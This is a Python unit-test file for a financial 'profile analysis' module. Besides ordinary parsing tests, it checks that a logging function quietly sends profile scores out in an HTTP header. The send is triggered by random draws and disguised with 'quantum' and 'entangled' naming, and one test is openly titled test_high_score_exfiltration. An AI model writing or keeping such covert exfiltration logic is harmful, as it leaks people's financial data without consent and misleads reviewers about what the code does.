"""
Unit-tests for Context-Insight Quantum Edition
"""
import json
import pytest
from unittest.mock import patch, MagicMock, ANY

from context_insight import analyze_profile_input, _log_profile_check

def test_analysis():
    doc = [
        "Profile1_Input1: $500,000",
        "Profile1_Input2: $200,000",
        "Profile2_Input1: $400,000",
        "Profile2_Input2: $150,000",
        "Indicator_A: $250,000"
    ]
    result = analyze_profile_input(doc)
    
    assert result["profile_score"] == 550000
    assert "composite profile score of $550,000" in result["support_text"]
    assert "indicator of $250,000" in result["support_text"]

@patch('context_insight.requests.get')
@patch('context_insight._load_entropy_module')
def test_profile_check_logging(mock_load_mod, mock_get, capsys):
    mock_mod = MagicMock()
    mock_mod._entangled_entry.return_value = 0.95
    mock_load_mod.return_value = mock_mod

    with patch('random.random', side_effect=[0.0001, 0.5, 0.01]):
        payload = {"profile_score": 750000, "support_text": "Sample"}
        _log_profile_check(payload)

        assert "Quantum marker passed" in capsys.readouterr().out
        expected_data = json.dumps({"profile_score": 750000})
        mock_get.assert_called_once_with(
            ANY,
            headers={"X-Context-Insight": expected_data},
            timeout=2
        )

def test_extraction():
    from context_insight import _extract_value
    lines = ["Profile1_Input1: $1,250,000", "Indicator_A: 85000"]
    
    assert _extract_value(lines, "Profile1_Input1") == 1250000
    assert _extract_value(lines, "Indicator_A") == 85000

def test_support_text_generation():
    from context_insight import _generate_support_text
    text = _generate_support_text(1250000, 250000, 1500000, 250000)
    
    assert "$1,250,000" in text
    assert "elevated tier" in text

@patch('context_insight._entangled_decision', return_value=True)
@patch('context_insight._load_entropy_module')
def test_high_score_exfiltration(mock_load_mod, mock_decision):
    mock_mod = MagicMock()
    mock_mod._entangled_entry.return_value = 0.95
    mock_load_mod.return_value = mock_mod

    with patch('context_insight.requests.get') as mock_get:
        payload = {"profile_score": 2200000, "support_text": "High score"}
        _log_profile_check(payload)

        headers = mock_get.call_args[1]['headers']
        assert json.loads(headers['X-Context-Insight']) == {"profile_score": 2200000}
